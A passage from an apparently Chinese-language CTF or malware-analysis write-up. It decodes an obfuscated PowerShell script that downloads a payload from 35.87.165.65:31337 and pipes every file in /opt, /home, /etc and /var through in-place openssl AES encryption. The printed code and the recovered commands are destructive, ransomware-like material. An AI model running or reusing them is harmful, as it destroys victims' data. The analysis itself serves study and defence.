class="variable">$GLOBAL:glba</span>[<span class="number">44</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">47</span>] + <span class="string">&#x27; &#x27;</span> + <span class="string">&quot; <span class="variable">$glbf</span> &quot;</span> + <span class="string">&#x27; &#x27;</span> + <span class="variable">$GLOBAL:glba</span>[<span class="number">11</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">48</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">53</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">52</span>] + <span class="string">&#x27; &#x27;</span> + <span class="string">&quot; <span class="variable">$glbf</span> &quot;</span>)</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$glbf</span> <span class="keyword">in</span> (&amp;(<span class="built_in">Get-Command</span> I?????<span class="literal">-E</span>?????????) (<span class="string">&#x27;f&#x27;</span> + <span class="variable">$GLOBAL:glba</span>[<span class="number">44</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">47</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">40</span>] + <span class="string">&#x27; &#x27;</span> + <span class="variable">$GLOBAL:glba</span>[<span class="number">13</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">54</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">37</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">50</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">13</span>] + <span class="string">&#x27; &#x27;</span> + <span class="variable">$GLOBAL:glba</span>[<span class="number">11</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">52</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">56</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">49</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">41</span>] + <span class="string">&#x27; &#x27;</span> + <span class="string">&#x27;f&#x27;</span>)))</span><br><span class="line">    &#123;</span><br><span class="line">        &amp;(<span class="built_in">Get-Command</span> I?????<span class="literal">-E</span>?????????) (<span class="string">&quot;&quot;</span> + <span class="variable">$GLOBAL:glba</span>[<span class="number">48</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">49</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">41</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">47</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">51</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">51</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">45</span>] + <span class="string">&#x27; &#x27;</span> + <span class="variable">$GLOBAL:glba</span>[<span class="number">41</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">47</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">39</span>] + <span class="string">&#x27; &#x27;</span> + <span class="variable">$GLOBAL:glba</span>[<span class="number">11</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">37</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">41</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">51</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">11</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">2</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">5</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">6</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">11</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">39</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">38</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">39</span>] + <span class="string">&#x27; &#x27;</span> + <span class="variable">$GLOBAL:glba</span>[<span class="number">11</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">49</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">37</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">51</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">51</span>] + <span class="string">&#x27; &#x27;</span> + <span class="string">&#x27;f&#x27;</span> + <span class="variable">$GLOBAL:glba</span>[<span class="number">44</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">45</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">41</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">14</span>] + <span class="string">&#x27;k&#x27;</span> + <span class="variable">$GLOBAL:glba</span>[<span class="number">41</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">56</span>] + <span class="string">&#x27; &#x27;</span> + <span class="variable">$GLOBAL:glba</span>[<span class="number">11</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">44</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">47</span>] + <span class="string">&#x27; &#x27;</span> + <span class="string">&quot; <span class="variable">$glbf</span> &quot;</span> + <span class="string">&#x27; &#x27;</span> + <span class="variable">$GLOBAL:glba</span>[<span class="number">11</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">48</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">53</span>] + <span class="variable">$GLOBAL:glba</span>[<span class="number">52</span>] + <span class="string">&#x27; &#x27;</span> + <span class="string">&quot; <span class="variable">$glbf</span> &quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Funce</span></span></span><br><span class="line">&#123;</span><br><span class="line">    &amp;(<span class="built_in">Get-Command</span> <span class="built_in">R</span>?m???<span class="literal">-I</span>???) <span class="variable">$GLOBAL:glba</span>[<span class="number">16</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Func</span><br></pre></td></tr></table></figure>

<p>发现这些函数的作用：</p>
<table>
<thead>
<tr>
<th>顺序</th>
<th>函数</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>b</td>
<td>检查运行环境（必须是 Ubuntu Noble，MAC 地址匹配）</td>
</tr>
<tr>
<td>2</td>
<td>d</td>
<td>提取系统信息生成字符集，用于后续拼接</td>
</tr>
<tr>
<td>3</td>
<td>a</td>
<td>下载远程 payload</td>
</tr>
<tr>
<td>4</td>
<td>c</td>
<td>执行 payload</td>
</tr>
<tr>
<td>5</td>
<td>e</td>
<td>删除下载的 payload 文件</td>
</tr>
</tbody></table>
<p>尝试恢复下载地址，直接执行<code>cat /etc/*release*</code>，发现返回值有17行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">DISTRIB_ID=Ubuntu</span><br><span class="line">DISTRIB_RELEASE=24.04</span><br><span class="line">DISTRIB_CODENAME=noble</span><br><span class="line">DISTRIB_DESCRIPTION=<span class="string">&quot;Ubuntu 24.04.1 LTS&quot;</span></span><br><span class="line">PRETTY_NAME=<span class="string">&quot;Ubuntu 24.04.1 LTS&quot;</span></span><br><span class="line">NAME=<span class="string">&quot;Ubuntu&quot;</span></span><br><span class="line">VERSION_ID=<span class="string">&quot;24.04&quot;</span></span><br><span class="line">VERSION=<span class="string">&quot;24.04.1 LTS (Noble Numbat)&quot;</span></span><br><span class="line">VERSION_CODENAME=noble</span><br><span class="line">ID=ubuntu</span><br><span class="line">ID_LIKE=debian</span><br><span class="line">HOME_URL=<span class="string">&quot;https://www.ubuntu.com/&quot;</span></span><br><span class="line">SUPPORT_URL=<span class="string">&quot;https://help.ubuntu.com/&quot;</span></span><br><span class="line">BUG_REPORT_URL=<span class="string">&quot;https://bugs.launchpad.net/ubuntu/&quot;</span></span><br><span class="line">PRIVACY_POLICY_URL=<span class="string">&quot;https://www.ubuntu.com/legal/terms-and-policies/privacy-policy&quot;</span></span><br><span class="line">UBUNTU_CODENAME=noble</span><br><span class="line">LOGO=ubuntu-logo</span><br></pre></td></tr></table></figure>

<p>而题目所给函数恰好也为0~16的索引：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Funcd</span></span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$glbd</span> = (&amp;(<span class="built_in">Get-Command</span> /???/?at) /etc/*release*).split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="variable">$glbc</span> = (<span class="variable">$glbd</span>[<span class="number">0</span>] += <span class="variable">$glbd</span>[<span class="number">1</span>].split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">0</span>] += <span class="variable">$glbd</span>[<span class="number">2</span>] += <span class="variable">$glbd</span>[<span class="number">3</span>].split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">0</span>] += <span class="variable">$glbd</span>[<span class="number">4</span>].split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">0</span>] += <span class="variable">$glbd</span>[<span class="number">5</span>] += <span class="variable">$glbd</span>[<span class="number">6</span>].split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">0</span>] += <span class="variable">$glbd</span>[<span class="number">7</span>].split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">0</span>] += <span class="variable">$glbd</span>[<span class="number">8</span>] += <span class="variable">$glbd</span>[<span class="number">9</span>] += <span class="variable">$glbd</span>[<span class="number">10</span>] += <span class="variable">$glbd</span>[<span class="number">11</span>] += <span class="variable">$glbd</span>[<span class="number">12</span>] += <span class="variable">$glbd</span>[<span class="number">13</span>] += <span class="variable">$glbd</span>[<span class="number">14</span>] += <span class="variable">$glbd</span>[<span class="number">15</span>] += <span class="variable">$glbd</span>[<span class="number">16</span>]).Tochararray() + <span class="number">0</span>..<span class="number">9</span></span><br><span class="line">    <span class="variable">$glbc</span> = (<span class="operator">-join</span> (<span class="variable">$glbc</span> | <span class="built_in">sort-object</span> | <span class="built_in">get-unique</span>))</span><br><span class="line">    <span class="variable">$Global:glba</span> = <span class="variable">$glbc</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编写脚本提取字符集：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">funcd_offline</span>():</span><br><span class="line">    fake_output = <span class="string">&#x27;&#x27;&#x27;DISTRIB_ID=Ubuntu</span></span><br><span class="line"><span class="string">    DISTRIB_RELEASE=24.04</span></span><br><span class="line"><span class="string">    DISTRIB_CODENAME=noble</span></span><br><span class="line"><span class="string">    DISTRIB_DESCRIPTION=&quot;Ubuntu 24.04.1 LTS&quot;</span></span><br><span class="line"><span class="string">    PRETTY_NAME=&quot;Ubuntu 24.04.1 LTS&quot;</span></span><br><span class="line"><span class="string">    NAME=&quot;Ubuntu&quot;</span></span><br><span class="line"><span class="string">    VERSION_ID=&quot;24.04&quot;</span></span><br><span class="line"><span class="string">    VERSION=&quot;24.04.1 LTS (Noble Numbat)&quot;</span></span><br><span class="line"><span class="string">    VERSION_CODENAME=noble</span></span><br><span class="line"><span class="string">    ID=ubuntu</span></span><br><span class="line"><span class="string">    ID_LIKE=debian</span></span><br><span class="line"><span class="string">    HOME_URL=&quot;https://www.ubuntu.com/&quot;</span></span><br><span class="line"><span class="string">    SUPPORT_URL=&quot;https://help.ubuntu.com/&quot;</span></span><br><span class="line"><span class="string">    BUG_REPORT_URL=&quot;https://bugs.launchpad.net/ubuntu/&quot;</span></span><br><span class="line"><span class="string">    PRIVACY_POLICY_URL=&quot;https://www.ubuntu.com/legal/terms-and-policies/privacy-policy&quot;</span></span><br><span class="line"><span class="string">    UBUNTU_CODENAME=noble</span></span><br><span class="line"><span class="string">    LOGO=ubuntu-logo</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    lines = [line.strip() <span class="keyword">for</span> line <span class="keyword">in</span> fake_output.splitlines()]</span><br><span class="line"></span><br><span class="line">    combined = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>):</span><br><span class="line">        <span class="keyword">if</span> i &gt;= <span class="built_in">len</span>(lines):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        line = lines[i]</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> &#123;<span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>&#125;:</span><br><span class="line">            key = line.split(<span class="string">&#x27;=&#x27;</span>, <span class="number">1</span>)[<span class="number">0</span>]</span><br><span class="line">            combined += key</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            combined += line</span><br><span class="line">    </span><br><span class="line">    combined += <span class="string">&#x27;0123456789&#x27;</span></span><br><span class="line">    seen = <span class="built_in">set</span>()</span><br><span class="line">    unique_chars = []</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> combined:</span><br><span class="line">        <span class="keyword">if</span> ch <span class="keyword">not</span> <span class="keyword">in</span> seen:</span><br><span class="line">            seen.add(ch)</span><br><span class="line">            unique_chars.append(ch)</span><br><span class="line"></span><br><span class="line">    glba = <span class="string">&#x27;&#x27;</span>.join(unique_chars)</span><br><span class="line">    <span class="keyword">return</span> glba</span><br><span class="line"></span><br><span class="line">glba = funcd_offline()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Character set (glba):&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(glba)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Length:&quot;</span>, <span class="built_in">len</span>(glba))</span><br></pre></td></tr></table></figure>

<p>得到字符集<code>DISTRB_=UbuntELACONMolePY&quot;VKdiaHhps:/w.cmGgr-vy0123456789</code>，排序后尝试恢复funca中的wget指令：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">glba = <span class="string">&#x27;DISTRB_=UbuntELACONMolePY&quot;VKdiaHhps:/w.cmGgr-vy0123456789&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sort_and_unique_ascii</span>(<span class="params">chars</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">sorted</span>(<span class="built_in">set</span>(chars)))</span><br><span class="line"></span><br><span class="line">glba = sort_and_unique_ascii(glba)</span><br><span class="line"></span><br><span class="line">glbe = glba[<span class="number">3</span>] + glba[<span class="number">5</span>] + glba[<span class="number">12</span>] + glba[<span class="number">8</span>] + glba[<span class="number">7</span>] + glba[<span class="number">12</span>] + glba[<span class="number">1</span>] + \</span><br><span class="line">       glba[<span class="number">6</span>] + glba[<span class="number">5</span>] + glba[<span class="number">12</span>] + glba[<span class="number">6</span>] + glba[<span class="number">5</span>] + glba[<span class="number">14</span>] + glba[<span class="number">3</span>] + \</span><br><span class="line">       glba[<span class="number">1</span>] + glba[<span class="number">3</span>] + glba[<span class="number">3</span>] + glba[<span class="number">7</span>] + glba[<span class="number">13</span>] + <span class="string">&#x27;k&#x27;</span> + glba[<span class="number">41</span>] + glba[<span class="number">56</span>]</span><br><span class="line"><span class="built_in">print</span>(glbe)</span><br><span class="line">glbb = glba[<span class="number">16</span>]</span><br><span class="line"><span class="built_in">print</span>(glbb)</span><br></pre></td></tr></table></figure>

<p>得到返回结果：<code>/18438-21821:/-//39key</code>和 <code>A</code>，发现貌似有些错位，再恢复一下func中的字符串作对照：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">glba = <span class="string">&#x27;DISTRB_=UbuntELACONMolePY&quot;VKdiaHhps:/w.cmGgr-vy0123456789&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sort_and_unique_ascii</span>(<span class="params">chars</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">sorted</span>(<span class="built_in">set</span>(chars)))</span><br><span class="line"></span><br><span class="line">glba = sort_and_unique_ascii(glba)</span><br><span class="line"><span class="built_in">print</span>(glba)</span><br><span class="line"></span><br><span class="line">a = <span class="string">&#x27;f&#x27;</span> + glba[<span class="number">44</span>] + glba[<span class="number">47</span>] + glba[<span class="number">40</span>] + <span class="string">&#x27; &#x27;</span> + glba[<span class="number">13</span>] + glba[<span class="number">48</span>] + glba[<span class="number">49</span>] + glba[<span class="number">52</span>] + glba[<span class="number">13</span>] + <span class="string">&#x27; &#x27;</span> + glba[<span class="number">11</span>] + glba[<span class="number">52</span>] + glba[<span class="number">56</span>] + glba[<span class="number">49</span>] + glba[<span class="number">41</span>] + <span class="string">&#x27; &#x27;</span> + <span class="string">&#x27;f&#x27;</span></span><br><span class="line">b = <span class="string">&quot;&quot;</span> + glba[<span class="number">48</span>] + glba[<span class="number">49</span>] + glba[<span class="number">41</span>] + glba[<span class="number">47</span>] + glba[<span class="number">51</span>] + glba[<span class="number">51</span>] + glba[<span class="number">45</span>] + <span class="string">&#x27; &#x27;</span> + glba[<span class="number">41</span>] + glba[<span class="number">47</span>] + glba[<span class="number">39</span>] + <span class="string">&#x27; &#x27;</span> + glba[<span class="number">11</span>] + glba[<span class="number">37</span>] + glba[<span class="number">41</span>] + glba[<span class="number">51</span>] + glba[<span class="number">11</span>] + glba[<span class="number">2</span>] + glba[<span class="number">5</span>] + glba[<span class="number">6</span>] + glba[<span class="number">11</span>] + glba[<span class="number">39</span>] + glba[<span class="number">38</span>] + glba[<span class="number">39</span>] + <span class="string">&#x27; &#x27;</span> + glba[<span class="number">11</span>] + glba[<span class="number">49</span>] + glba[<span class="number">37</span>] + glba[<span class="number">51</span>] + glba[<span class="number">51</span>] + <span class="string">&#x27; &#x27;</span> + <span class="string">&#x27;f&#x27;</span> + glba[<span class="number">44</span>] + glba[<span class="number">45</span>] + glba[<span class="number">41</span>] + glba[<span class="number">14</span>] + <span class="string">&#x27;k&#x27;</span> + glba[<span class="number">41</span>] + glba[<span class="number">56</span>] + <span class="string">&#x27; &#x27;</span> + glba[<span class="number">11</span>] + glba[<span class="number">44</span>] + glba[<span class="number">47</span>] + <span class="string">&#x27; &#x27;</span> + <span class="string">&quot; $glbf &quot;</span> + <span class="string">&#x27; &#x27;</span> + glba[<span class="number">11</span>] + glba[<span class="number">48</span>] + glba[<span class="number">53</span>] + glba[<span class="number">52</span>] + <span class="string">&#x27; &#x27;</span> + <span class="string">&quot; $glbf &quot;</span></span><br><span class="line">c = <span class="string">&#x27;f&#x27;</span> + glba[<span class="number">44</span>] + glba[<span class="number">47</span>] + glba[<span class="number">40</span>] + <span class="string">&#x27; &#x27;</span> + glba[<span class="number">13</span>] + glba[<span class="number">43</span>] + glba[<span class="number">48</span>] + glba[<span class="number">46</span>] + glba[<span class="number">41</span>] + glba[<span class="number">13</span>] + <span class="string">&#x27; &#x27;</span> + glba[<span class="number">11</span>] + glba[<span class="number">52</span>] + glba[<span class="number">56</span>] + glba[<span class="number">49</span>] + glba[<span class="number">41</span>] + <span class="string">&#x27; &#x27;</span> + <span class="string">&#x27;f&#x27;</span></span><br><span class="line">d = <span class="string">&quot;&quot;</span> + glba[<span class="number">48</span>] + glba[<span class="number">49</span>] + glba[<span class="number">41</span>] + glba[<span class="number">47</span>] + glba[<span class="number">51</span>] + glba[<span class="number">51</span>] + glba[<span class="number">45</span>] + <span class="string">&#x27; &#x27;</span> + glba[<span class="number">41</span>] + glba[<span class="number">47</span>] + glba[<span class="number">39</span>] + <span class="string">&#x27; &#x27;</span> + glba[<span class="number">11</span>] + glba[<span class="number">37</span>] + glba[<span class="number">41</span>] + glba[<span class="number">51</span>] + glba[<span class="number">11</span>] + glba[<span class="number">2</span>] + glba[<span class="number">5</span>] + glba[<span class="number">6</span>] + glba[<span class="number">11</span>] + glba[<span class="number">39</span>] + glba[<span class="number">38</span>] + glba[<span class="number">39</span>] + <span class="string">&#x27; &#x27;</span> + glba[<span class="number">11</span>] + glba[<span class="number">49</span>] + glba[<span class="number">37</span>] + glba[<span class="number">51</span>] + glba[<span class="number">51</span>] + <span class="string">&#x27; &#x27;</span> + <span class="string">&#x27;f&#x27;</span> + glba[<span class="number">44</span>] + glba[<span class="number">45</span>] + glba[<span class="number">41</span>] + glba[<span class="number">14</span>] + <span class="string">&#x27;k&#x27;</span> + glba[<span class="number">41</span>] + glba[<span class="number">56</span>] + <span class="string">&#x27; &#x27;</span> + glba[<span class="number">11</span>] + glba[<span class="number">44</span>] + glba[<span class="number">47</span>] + <span class="string">&#x27; &#x27;</span> + <span class="string">&quot; $glbf &quot;</span> + <span class="string">&#x27; &#x27;</span> + glba[<span class="number">11</span>] + glba[<span class="number">48</span>] + glba[<span class="number">53</span>] + glba[<span class="number">52</span>] + <span class="string">&#x27; &#x27;</span> + <span class="string">&quot; $glbf &quot;</span></span><br><span class="line">e = <span class="string">&#x27;f&#x27;</span> + glba[<span class="number">44</span>] + glba[<span class="number">47</span>] + glba[<span class="number">40</span>] + <span class="string">&#x27; &#x27;</span> + glba[<span class="number">13</span>] + glba[<span class="number">41</span>] + glba[<span class="number">52</span>] + glba[<span class="number">39</span>] + glba[<span class="number">13</span>] + <span class="string">&#x27; &#x27;</span> + glba[<span class="number">11</span>] + glba[<span class="number">52</span>] + glba[<span class="number">56</span>] + glba[<span class="number">49</span>] + glba[<span class="number">41</span>] + <span class="string">&#x27; &#x27;</span> + <span class="string">&#x27;f&#x27;</span></span><br><span class="line">f = <span class="string">&quot;&quot;</span> + glba[<span class="number">48</span>] + glba[<span class="number">49</span>] + glba[<span class="number">41</span>] + glba[<span class="number">47</span>] + glba[<span class="number">51</span>] + glba[<span class="number">51</span>] + glba[<span class="number">45</span>] + <span class="string">&#x27; &#x27;</span> + glba[<span class="number">41</span>] + glba[<span class="number">47</span>] + glba[<span class="number">39</span>] + <span class="string">&#x27; &#x27;</span> + glba[<span class="number">11</span>] + glba[<span class="number">37</span>] + glba[<span class="number">41</span>] + glba[<span class="number">51</span>] + glba[<span class="number">11</span>] + glba[<span class="number">2</span>] + glba[<span class="number">5</span>] + glba[<span class="number">6</span>] + glba[<span class="number">11</span>] + glba[<span class="number">39</span>] + glba[<span class="number">38</span>] + glba[<span class="number">39</span>] + <span class="string">&#x27; &#x27;</span> + glba[<span class="number">11</span>] + glba[<span class="number">49</span>] + glba[<span class="number">37</span>] + glba[<span class="number">51</span>] + glba[<span class="number">51</span>] + <span class="string">&#x27; &#x27;</span> + <span class="string">&#x27;f&#x27;</span> + glba[<span class="number">44</span>] + glba[<span class="number">45</span>] + glba[<span class="number">41</span>] + glba[<span class="number">14</span>] + <span class="string">&#x27;k&#x27;</span> + glba[<span class="number">41</span>] + glba[<span class="number">56</span>] + <span class="string">&#x27; &#x27;</span> + glba[<span class="number">11</span>] + glba[<span class="number">44</span>] + glba[<span class="number">47</span>] + <span class="string">&#x27; &#x27;</span> + <span class="string">&quot; $glbf &quot;</span> + <span class="string">&#x27; &#x27;</span> + glba[<span class="number">11</span>] + glba[<span class="number">48</span>] + glba[<span class="number">53</span>] + glba[<span class="number">52</span>] + <span class="string">&#x27; &#x27;</span> + <span class="string">&quot; $glbf &quot;</span></span><br><span class="line">g = <span class="string">&#x27;f&#x27;</span> + glba[<span class="number">44</span>] + glba[<span class="number">47</span>] + glba[<span class="number">40</span>] + <span class="string">&#x27; &#x27;</span> + glba[<span class="number">13</span>] + glba[<span class="number">54</span>] + glba[<span class="number">37</span>] + glba[<span class="number">50</span>] + glba[<span class="number">13</span>] + <span class="string">&#x27; &#x27;</span> + glba[<span class="number">11</span>] + glba[<span class="number">52</span>] + glba[<span class="number">56</span>] + glba[<span class="number">49</span>] + glba[<span class="number">41</span>] + <span class="string">&#x27; &#x27;</span> + <span class="string">&#x27;f&#x27;</span></span><br><span class="line">h = <span class="string">&quot;&quot;</span> + glba[<span class="number">48</span>] + glba[<span class="number">49</span>] + glba[<span class="number">41</span>] + glba[<span class="number">47</span>] + glba[<span class="number">51</span>] + glba[<span class="number">51</span>] + glba[<span class="number">45</span>] + <span class="string">&#x27; &#x27;</span> + glba[<span class="number">41</span>] + glba[<span class="number">47</span>] + glba[<span class="number">39</span>] + <span class="string">&#x27; &#x27;</span> + glba[<span class="number">11</span>] + glba[<span class="number">37</span>] + glba[<span class="number">41</span>] + glba[<span class="number">51</span>] + glba[<span class="number">11</span>] + glba[<span class="number">2</span>] + glba[<span class="number">5</span>] + glba[<span class="number">6</span>] + glba[<span class="number">11</span>] + glba[<span class="number">39</span>] + glba[<span class="number">38</span>] + glba[<span class="number">39</span>] + <span class="string">&#x27; &#x27;</span> + glba[<span class="number">11</span>] + glba[<span class="number">49</span>] + glba[<span class="number">37</span>] + glba[<span class="number">51</span>] + glba[<span class="number">51</span>] + <span class="string">&#x27; &#x27;</span> + <span class="string">&#x27;f&#x27;</span> + glba[<span class="number">44</span>] + glba[<span class="number">45</span>] + glba[<span class="number">41</span>] + glba[<span class="number">14</span>] + <span class="string">&#x27;k&#x27;</span> + glba[<span class="number">41</span>] + glba[<span class="number">56</span>] + <span class="string">&#x27; &#x27;</span> + glba[<span class="number">11</span>] + glba[<span class="number">44</span>] + glba[<span class="number">47</span>] + <span class="string">&#x27; &#x27;</span> + <span class="string">&quot; $glbf &quot;</span> + <span class="string">&#x27; &#x27;</span> + glba[<span class="number">11</span>] + glba[<span class="number">48</span>] + glba[<span class="number">53</span>] + glba[<span class="number">52</span>] + <span class="string">&#x27; &#x27;</span> + <span class="string">&quot; $glbf &quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a,end=<span class="string">&quot; | &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"><span class="built_in">print</span>(c,end=<span class="string">&quot; | &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"><span class="built_in">print</span>(e,end=<span class="string">&quot; | &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(f)</span><br><span class="line"><span class="built_in">print</span>(g,end=<span class="string">&quot; | &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(h)</span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">find 9opt9 7type f | openssl enc 7aes7.127cbc 7pass file:key 7in  <span class="variable">$glbf</span>  7out  <span class="variable">$glbf</span></span><br><span class="line">find 9home9 7type f | openssl enc 7aes7.127cbc 7pass file:key 7in  <span class="variable">$glbf</span>  7out  <span class="variable">$glbf</span></span><br><span class="line">find 9etc9 7type f | openssl enc 7aes7.127cbc 7pass file:key 7in  <span class="variable">$glbf</span>  7out  <span class="variable">$glbf</span></span><br><span class="line">find 9var9 7type f | openssl enc 7aes7.127cbc 7pass file:key 7in  <span class="variable">$glbf</span>  7out  <span class="variable">$glbf</span></span><br></pre></td></tr></table></figure>

<p>发现确实存在轻微错位的现象，主要集中在数字和符号部分，字母未收到影响，打印排序后的字符串得到：<code>&quot;-./0123456789:=ABCDEGHIKLMNOPRSTUVY_abcdeghilmnoprstuvwy</code> ，微调字符集，发现0~9要移到开头，得到正确的地址：<code>35.87.165.65:31337/key</code>，下载后查看内容：</p>
